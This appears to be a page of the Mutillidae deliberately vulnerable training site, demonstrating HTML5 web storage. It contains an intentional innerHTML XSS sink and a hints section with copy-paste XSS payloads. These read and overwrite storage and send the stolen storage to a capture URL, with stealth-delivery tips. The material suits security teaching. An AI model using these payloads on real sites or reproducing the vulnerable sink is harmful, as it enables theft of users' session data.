<?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure.
    			$lUseClientSideStorageForSensitiveData = TRUE;
    			$lUseJavaScriptValidation = FALSE;
    		break;

    		case "1": // This code is insecure.
    			$lUseClientSideStorageForSensitiveData = TRUE;
    			$lUseJavaScriptValidation = TRUE;
    		break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
    			$lUseClientSideStorageForSensitiveData = FALSE;
    			$lUseJavaScriptValidation = TRUE;
    		break;
    	}// end switch
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration on page html5-storage.php");
	}// end try	
	
	if($lUseClientSideStorageForSensitiveData){
		echo "<script type=\"text/javascript\" src=\"javascript/html5-secrets.js\"></script>";		
	}// end if
?>

<div class="page-title">HTML 5 Storage</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	/* 
		The Storage interface of the browser API
	
		interface Storage {
			  readonly attribute unsigned long length;
			  DOMString? key(unsigned long index);
			  getter DOMString getItem(DOMString key);
			  setter creator void setItem(DOMString key, DOMString value);
			  deleter void removeItem(DOMString key);
			  void clear();
		};
	*/

	<?php 
		if ($lUseJavaScriptValidation){
			echo "var gUseJavaScriptValidation = \"TRUE\";";
		}else{
			echo "var gUseJavaScriptValidation = \"FALSE\";";
		}
	?>

	window.sessionStorage.setItem("CurrentBrowser", Navigator.userAgent);
	window.localStorage.setItem("MessageOfTheDay","Go Cats!");

	var addRow = function(pKey, pItem, pStorageType){
		try{
			var lDocRoot = window.document;
			var lTBody = lDocRoot.getElementById("idSessionStorageTableBody");
			var lTR = lDocRoot.createElement("tr");
			var lKeyTD = lDocRoot.createElement("td");
			var lItemTD = lDocRoot.createElement("td");
			var lTypeTD = lDocRoot.createElement("td");			
			var lBlankTD = lDocRoot.createElement("td");

			//lKeyTD.addAttribute("class", "label");
			lItemTD.style.textAlign = "center";
			lKeyTD.appendChild(lDocRoot.createTextNode(pKey));
			lItemTD.appendChild(lDocRoot.createTextNode(pItem));
			lTypeTD.appendChild(lDocRoot.createTextNode(pStorageType));
			lBlankTD.appendChild(lDocRoot.createTextNode(""));
			
			lTR.appendChild(lKeyTD);
			lTR.appendChild(lItemTD);
			lTR.appendChild(lTypeTD);
			lTR.appendChild(lBlankTD);
			lTBody.appendChild(lTR);
		}catch(/*Exception*/ e){
			alert("Error trying to add row in function addRow(): " + e.name + "-" + e.message);
		};// end try
	};//end JavaScript function addRow

	var setMessage = function(/* String */ pMessage){
		var lMessageSpan = document.getElementById("idAddItemMessageSpan");
		lMessageSpan.innerHTML = pMessage;
		lMessageSpan.setAttribute("class","success-message");
	};// end function setMessage

	var addItemToStorage = function(theForm){
		try{			
			var lKey = theForm.DOMStorageKey.value;
			var lItem = theForm.DOMStorageItem.value;
			var lType = "";
			var lUnacceptableKeyPattern = "[^A-Za-z0-9]";

			//alert(lKey.match(lAcceptableKeyPattern));
			if (lKey.match(lUnacceptableKeyPattern)){
				setMessage("Unable to add key " + lKey.toString() + " because it contains non-alphanumeric characters");
				return false;
			}// end if

			if (gUseJavaScriptValidation == "TRUE"){
				var lInvalidTR = document.getElementById("id-invalid-input-tr");
				if(lKey.length == 0 || lItem.length == 0){
					lInvalidTR.style.display = "";
					return false;
				}else{
					lInvalidTR.style.display = "none";
				}// end if
			}// end if

			if(theForm.SessionStorageType[0].checked){
				window.sessionStorage.setItem(lKey, lItem);
				lType = "Session";
			}else if (theForm.SessionStorageType[1].checked){
				window.localStorage.setItem(lKey, lItem);
				lType = "Local";
			}// end if

			addRow(lKey, lItem, lType);
			setMessage("Added key " + lKey.toString() + " to " + lType.toString() + " storage");

		}catch(/*Exception*/ e){
			alert("Error in function addItemToStorage(): " + e.name + "-" + e.message);
		}// end try
	};// end JavaScript function

	var init = function(){
		var s = sessionStorage;
		var l = localStorage;
		var m = "";
				
		// grab local storage
		for(i=0;i<s.length;i++){
			var lKey = s.key(i);
			if(lKey.match(/^[^Secure]/)){addRow(lKey, s.getItem(lKey), "Session");};
		}
	
		// grab session storage
		for(i=0;i<l.length;i++){
			var lKey = l.key(i);
			if(lKey.match(/^[^Secure]/)){addRow(lKey, l.getItem(lKey), "Local");};
		}// end if

	};//end JavaScript function init
	
</script>

<form 	action="index.php?page=html5-storage.php" 
		method="post" 
		enctype="application/x-www-form-urlencoded" 
		onsubmit="return false;"
		id="idForm">		
	<table style="margin-left:auto; margin-right:auto; width: 600px;">
		<tr id="id-invalid-input-tr" style="display: none;">
			<td class="error-message">
				Error: Invalid Input - Both Key and Item are required fields
			</td>
		</tr>
		<tr>
			<td class="form-header">HTML 5 Web Storage</td>
		</tr>
		<tr><td>&nbsp;<td></tr>
	</table>
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td class="sub-header" colspan="3">Web Storage</td>
			<td>&nbsp;</td>
		</tr>
		<tr>
			<td class="sub-body">Key</td>
			<td class="sub-body">Item</td>
			<td class="sub-body">Storage Type</td>
			<td>&nbsp;</td><td>&nbsp;</td>
		</tr>
		<tbody id="idSessionStorageTableBody" style="font-weight:bold;"></tbody>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td><input type="text" id="idDOMStorageKeyInput" name="DOMStorageKey" size="20"></td>
			<td><input type="text" id="idDOMStorageItemInput" name="DOMStorageItem" size="20"></td>
			<td class="label">
				<input type="radio" name="SessionStorageType" value="Session" checked="checked" />Session
				<input type="radio" name="SessionStorageType" value="Local" />Local
			</td>
			<td>
				<input	onclick="addItemToStorage(this.form);" 
						class="button" 
						type="button" 
						value="Add New" />
			</td>
		</tr>
		<tr><td>&nbsp;</td></tr>
		<tfoot id="idSessionStorageTableFooter">
			<tr><th colspan="5"><span id="idAddItemMessageSpan"></span></th></tr>
			<tr><td>&nbsp;</td></tr>
		</tfoot>
	</table>
</form>
<div style="margin-left:auto; margin-right:auto; width:600px;">
	<span title="Click to delete session storage" onclick='sessionStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;" />
		<span style="font-weight: bold;">Session Storage</span>
	</span>
	<span title="Click to delete locate storage" onclick='localStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;margin-left: 20px;" />
		<span style="font-weight: bold;">Local Storage</span>
	</span>
	<span title="Click to delete all html 5 storage" onclick='sessionStorage.clear();localStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;margin-left: 20px;" />
		<span style="font-weight: bold;">All Storage</span>
	</span>
</div>

<script type="text/javascript">
<!--
	try{
		document.getElementById("idDOMStorageKeyInput").focus();
		init();
	}catch(/*Exception*/ e){
		alert("Error trying to set focus: " + e.message);
	}// end try
//-->
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<div>&nbsp;</div>
			<div>&nbsp;</div>
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<br/>
						<span class="report-header">DOM Injection</span>
						<br/><br/>
						Use Firebug or similar to examine the message that appears when a new
						item is added to storage. The message appears in a label below the two input fields.
						Inject XSS into the "key" field. This is output
						into the message. Craft a XSS to read the DOM storage or perform other 
						action.
						<br/><br/>
						<span class="report-header">HTML5 Storage API</span>
						<br/><br/>
						The Storage interface of the browser API
						<br/>
<code>							
interface Storage {
	readonly attribute unsigned long length;
	DOMString? key(unsigned long index);
	getter DOMString getItem(DOMString key);
	setter creator void setItem(DOMString key, DOMString value);
	deleter void removeItem(DOMString key);
	void clear();
}
</code>
						<br/>		
						An "interface" is a software class that is only a definition in itself
						and must be implemented to work. The Storage interface is implemented twice
						in the browser as part of the "Window" DOM object. One implementation 
						is the "Local Storage" object named "localStorage" and the other is 
						the "Session Storage" object named "sessionStorage".
						<br/><br/>
						To call the methods defined in the interface, call them using the "window"
						scope.
						<br/><br/>
						Example: 
						<br/>
<code>
// grab local session storage
var m = "";
var l = window.localStorage;
for(i=0;i&lt;length;i++){
	var lKey = l.key(i);
	m += lKey + "=" + l.getItem(lKey) + "; ";
}// end for i
alert(m);
</code>
								<br />
								<span class="report-header">Locating pages which use HTML5 storage</span>
								<br /><br />
								Pages using HTML5 storage are easy to locate since the source code is client-side. The 
								JavaScript API specifies the session storage objects are named sessionStorage and 
								localStorage which are both properties of the window object. Developers may put the 
								JavaScript in an included file, so check for JavaScript include file and search the 
								source code for "sessionStorage" and "localStorage".
								<br /><br />
								<span class="report-header">Reading HTML5 storage from the Browser</span>
								<br /><br />
								The values a site has placed into your browser can be read by you. They can also 
								be changed by you. Developers should know better than to place any type of 
								authentication token anywhere on the client, but this problem has existed 
								well before HTML5 storage and will continue with HTML storage.
								<br />
						  		If the web developer is trying to hide something in session storage or local storage
						  		that you want to read, you can type JavaScript into your browser address
						  		bar to read the HTML 5 storage. Cookies in general should not contain any
						  		information classified above "public". Developers are constantly making
						  		the mistake of thinking that because cookies happen to be difficult to view,
						  		they cannot be viewed. Functionally, HTML 5 storage is analogous to a big
						  		cookie.
								<br /><br />
								In some browsers, you can run JavaScript against the current page by 
								placing the prefix "javascript"
								followed by a colon and your JavaScript into the address bar.
								<br/><br/>
								Try It (Newer Firefox require you allow JavaScript in URL bar (about:config)):
								<br />
<code>
javascript:alert("It Works!");
</code>
							<br />
							NOTE: If new browsers disable JavaScript in the URL bar, install a real-time page 
							editor such as FireBug. In Firebug, open the "console" and use the command-line
							area at the bottom (Look for ">>>").
							<br/><br/>
							HTML5 storage provides an API for interaction with JavaScript. Therefore if
							you are using a page that uses HTML5 storage, you can read it with a 
							JavaScript. (The HTML5 storage is on your browser, so you may just be
							able to use the browser itself.)  
							<br/><br/>
							This script can read HTML5 storage from the page currently being browsed:
							<br />
<code>
&lt;script&gt;
	try{
		var m = &quot;&quot;;
		var l = window.localStorage;
		var s = window.sessionStorage;
		
		for(i=0;i&lt;l.length;i++){
			var lKey = l.key(i);
			m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
		};

		for(i=0;i&lt;s.length;i++){
			var lKey = s.key(i);
			m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
		};
		
		alert(m);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
							<br />
							Copy and Paste:
							<br /><br />
<code>
<span class="important-code">// JavaScript Alert Box version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage; var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">alert(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// window.document.write version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">window.document.write(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// Fireug console.log() or console.debug() version</span>
<span class="important-code">// NOTE: This version must be executed in the Firebug console</span>
try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">console.log(m)</span>;}catch(e){alert(e.message);}
</code>

							<br />
							Except in SECURE mode, this page has some "secrets" hidden in the HTML5 storage. 
							To figure out what are the items, use a JavaScript injection in the Back button or
							the page footer (HTTP user-agent header) to inject your own JavaScript. 
							An easier way would be to remember that all the HTML5 storage and all JavaScript 
							is client-side which means it is running on your machine. You can simply read the 
							JavaScript that set the storage items.
							<br/><br/>
							<span class="report-header">Injecting values into session storage</span>
							<br /><br />
							If you are visiting a web site utilizing HTML5 storage, the storage is on your
							browser so injecting values is relatively easy but remember that HTML5 storage
							is stored by domain, protocol, and port so any code used to set storage values
							must be done in the context of the target page.
							<br /><br />
							This script will inject the following keys with the following values into the 
							current page context. This context will be valid as long as the domain, protocol,
							and port do not change.
							<br/>
<code>
&lt;script&gt;
	localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);
	sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
	sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);		
	sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);
&lt;/script&gt;
</code>
							<br />
							Copy and Paste:
							<br />
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); &lt;/script&gt;
</code>
							<br />
							After setting the values, read them back for confirmation. Use the scripts
							under section "Reading HTML5 storage". In fact, we can combine the two scripts
							and run them back to back.
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage; for(i=0;i&lt;l.length;i++){ var lKey = l.key(i); m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;}; for(i=0;i&lt;s.length;i++){ var lKey = s.key(i); m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;}; alert(m);}catch(e){ alert(e.message); } &lt;/script&gt;
</code>
							<br /><br />
							<span class="report-header">Over-writing existing HTML5 storage values</span>
							<br /><br/>
							Determine what the existing key-value pairs are in the HTML5 storage. 
							Use the scripts under section "Reading HTML5 storage". Choose the
							key-value pair to set. Finally use a script to over-write the 
							key-value pair. Note that the setItem() methods adds a new 
							key-value pair if the key does not already exist but over-writes
							the current value if the key is present.
							<br /><br />
							A smaller script can be used to read the currently stored keys:
							<br /> 
<code>
&lt;script&gt; var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; for(i=0;i&lt;s.length;i++){m += &quot;sessionStorage:&quot; + s.key(i) + &quot;;\n&quot;;} for(i=0;i&lt;l.length;i++){m += &quot;localStorage:&quot; + l.key(i) + &quot;;\n&quot;;} alert(m); &lt;/script&gt;
</code>
							<br />
							One of the keys on this page is "MessageOfTheDay". To change that particular
							value, we can use another script:
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); &lt;/script&gt;
</code>
							<br />
							Depending on when this script is injected, the page may not display the changes.
							An inspection of the code reveals that the page calls a function "init()"
							in order to display the current values. Calling "init()" again after
							changing the value should show the change. Watch carefully. The page will
							display HTML5 storage from the initial call to init() then display
							all the values again. Notice the message of the day is different in the 
							second listing. Here is the modified script.
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">init();</span>&lt;/script&gt;
</code>
							<br/>
							One problem is the user might notice the page is not the same. Instead of one "MessageOfTheDay"
							there are now two; the original message plus the new message added by the cross-site script.
							To solve this issue, first overwrite the original message, then delete all the table rows being displayed.
							To delete the messages, use JavaScript to alter the DOM on the page.
							Finally call the pages own init() function to redraw the table.
							<br/>
							Hint: Click "View Source" and read the JavaScript in the init() function. It shows that the
							&quot;idSessionStorageTableBody&quot; is the HTML DOM element to which the table
							rows are added.
							<br/>
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">var node=window.document.getElementById(&quot;idSessionStorageTableBody&quot;); while(node.hasChildNodes()){node.removeChild(node.firstChild)};</span> init();&lt;/script&gt;
</code>					
							<br /><br />
							<span class="report-header">Reading another users HTML5 storage</span>
							<br/><br/>
							If you want to read someone elses session storage or local storage,
							remember where the storage is located. The storage is on the client 
							machine	and is only accessible by scripts running in their browser.
							Therefore you need to get your JavaScript to run on that users machine.
							One way to do this is to either plant a persistent cross site script (XSS)
							and wait for the user to visit the infected site or phish using a
							reflected cross site script.
							<br/><br/>
							If injecting JavaScript into HTML, using a body-onload event or an image
							tag can be effective without overtly alerting the user. JavaScript can
							also be injected by wrapping the JavaScript code in script tags.
							<br/><br/>
							If injecting JavaScript into existing JavaScript code, 
							using an XHR (aka AJAX aka Web 2.0) script is a good way to inject scripts
							because the resulting script execution is less likely to be noticed by
							the user.
							<br/><br/>
							We can collect the HTML5 storage using the same script as in "Reading HTML5 
							Storage" but instead of displaying the data in a popup alert box we can
							send the data to a capture page.
							<br/>
<code>
&lt;script&gt;
	try{ 
		var s = sessionStorage;
		var l = localStorage;
		var m = &quot;&quot;;
		var lXMLHTTP;
					
		for(i=0;i&lt;s.length;i++){
			m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;;
		}

		for(i=0;i&lt;l.length;i++){
			m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;;
		}

		var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; 
		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
		lXMLHTTP.open(&quot;GET&quot;, lAction); 
		lXMLHTTP.send(&quot;&quot;); 
	}catch(e){} 
&lt;/script&gt;
</code>
							<br/>
							Copy and Paste:
							<br />
<code>
&lt;script&gt; try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
</code>
							<br/>							
								Try injecting JavaScript into the user-agent HTTP header because it is displayed
								in the footer.
							<br /><br />
							<span class="report-header">Where is this page vulnerable to cross site scripting</span>
							<br/><br/>
							The add new key field is vulnerable to HTML injection and event based JavaScript
							injection because the keys that are added by the user are reflected back when
							the page inserts the key into the span using the innerHTML property.
							<br/><br/>
							For example, the following key can injected along with any value.
							<br/>
<code>
&lt;/span&gt;&lt;span onmouseover=&quot;alert(1);&quot;&gt;ERROR&lt;/span&gt;&lt;span&gt;
</code>
							<br/>
							The "BACK" button is vulnerable to JavaScript injection and the page footer
							displays the value of the user-agent string making it vulnerable as well.
							<br/><br/>
							The most practical vulnerabilities is the users message. Note the site does
							not output encode the username or the users message. These values are
							database values meaning they present a persistent cross site script.
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>